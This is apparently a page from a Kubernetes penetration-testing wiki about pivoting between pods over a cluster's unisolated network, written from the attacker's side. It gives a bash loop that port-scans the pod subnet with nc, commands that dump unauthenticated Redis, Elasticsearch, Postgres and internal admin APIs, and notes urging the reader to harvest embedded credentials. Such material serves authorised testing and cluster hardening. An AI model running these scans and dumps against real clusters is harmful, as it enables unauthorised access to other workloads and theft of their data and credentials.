---
title: "Pod-to-pod pivoting: reaching other workloads over the flat network"
description: "By default every pod can reach every other pod and service in the cluster, because Kubernetes applies no network isolation without a NetworkPolicy. An attacker in one pod scans the pod network and connects directly to other workloads and their backing services, which are frequently unauthenticated internally, to steal data and credentials and expand the foothold."
keywords:
  - pod pivoting
  - flat network
  - pod network
  - internal services
  - lateral movement
---

# Pod-to-pod pivoting

Kubernetes networking is flat by default: every pod has an IP that every other pod and service can reach, and no isolation exists until a NetworkPolicy is applied. From one compromised pod an attacker therefore reaches every workload in the cluster at the network level. Internal services assume only trusted cluster peers connect, so they are often unauthenticated, making a direct connection enough to read databases, caches, message queues, and internal APIs and to harvest the credentials they hold.

Map and reach neighbours:

```bash
# local subnet and the pod/service networks
ip -4 addr; ip route
# endpoints (real pod IPs) are the best targets, via the API if reachable
kubectl get endpoints -A -o wide 2>/dev/null
# sweep the pod CIDR for common service ports
for ip in 10.244.0.{1..254}; do for p in 6379 5432 3306 9200 27017 8080; do
  (nc -z -w1 $ip $p 2>/dev/null && echo "$ip:$p open") & done; done; wait
```

## Connect and loot

```bash
# unauthenticated internal services are common; examples:
redis-cli -h 10.244.0.5 keys '*'                        # redis with no auth
curl -s http://10.244.0.6:9200/_search?size=100         # elasticsearch
psql -h 10.244.0.7 -U postgres -c '\l'                  # postgres with trust/weak auth
# an internal HTTP API reachable pod-to-pod often needs no token
curl -s http://10.244.0.8:8080/admin
```

## Exploitation notes

- Target endpoint pod IPs directly rather than service VIPs where possible; hitting the pod bypasses any assumptions baked into the service layer.
- Internal datastores (Redis, Elasticsearch, MongoDB, internal HTTP APIs) are the richest finds because they are so often unauthenticated on the cluster network; dump them for data and embedded credentials.
- A NetworkPolicy, if present, restricts this; see [NetworkPolicy bypass](../network/networkpolicy-bypass.md). The flat-network assumption holds only until a policy exists, which many clusters never add.
- Combine with [Service and network discovery](../cluster-enumeration/service-and-network-discovery.md) for DNS-based target finding.

## References

- [Kubernetes: cluster networking](https://kubernetes.io/docs/concepts/cluster-administration/networking/)
- [Kubernetes: network policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [HackTricks: Kubernetes network](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security)
